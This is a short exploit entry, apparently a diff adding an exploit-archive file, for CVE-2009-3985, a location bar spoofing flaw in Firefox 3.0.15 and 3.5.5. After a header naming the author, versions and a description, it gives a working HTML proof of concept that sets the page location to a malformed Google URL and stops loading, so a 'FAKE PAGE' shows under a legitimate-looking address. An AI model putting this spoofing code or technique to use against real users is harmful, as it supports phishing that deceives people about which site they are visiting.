@@ -1,0 +1,20 @@
+# Exploit Title: MOZILLA FIREFOX LOCATION BAR SPOOFING VULNERABILITY
+# Date: 2009-12-18
+# Author: Jordi Chancel
+# Software Link: http://www.mozilla.org/security/announce/2009/mfsa2009-69.html
+# Version: Mozilla Firefox 3.0.15 & 3.5.5
+# Tested on: Windows XP-VISTA-SEVEN & LINUX BACKTRACK
+# CVE : http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3985
+# DESCRIPTION: {
+#		Security researcher Jordi Chancel reported an issue similar to one fixed in mfsa2009-44
+#		in which a web page can set document.location to a URL that can't be displayed properly and then inject 
+#		content into the resulting blank page. An attacker could use this vulnerability to place a legitimate-looking 
+#		but invalid URL in the location bar and inject HTML and JavaScript into the body of the 
+#		page, resulting in a spoofing attack.  }
+# Code :
+<html>
+<title>FAKE PAGE</title>
+<body onload="javascript:window.location = 'https://www.google.com%20';window.stop();void(0);">
+<h1>FAKE PAGE</h1>
+</body>
+</html>
